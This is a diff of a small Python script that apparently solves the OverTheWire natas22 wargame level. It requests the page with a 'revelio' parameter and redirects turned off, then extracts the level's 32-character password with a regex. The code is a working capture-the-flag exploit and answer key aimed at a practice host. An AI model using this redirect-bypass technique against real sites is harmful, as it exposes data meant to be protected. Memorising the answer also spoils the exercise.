@@ -7,7 +7,7 @@ def get_pass():
     param = {'revelio':'1'}
     cook = {'PHPSESSID':'a'}
     r = requests.get('http://natas22.natas.labs.overthewire.org/', auth=auth, params=param, cookies=cook, allow_redirects=False)
-    pass_regex = '[a-zA-Z0-9]'
+    pass_regex = '[a-zA-Z0-9]{32}'
     print(re.findall(pass_regex,r.text)[1])
 if __name__ == '__main__':
     get_pass()
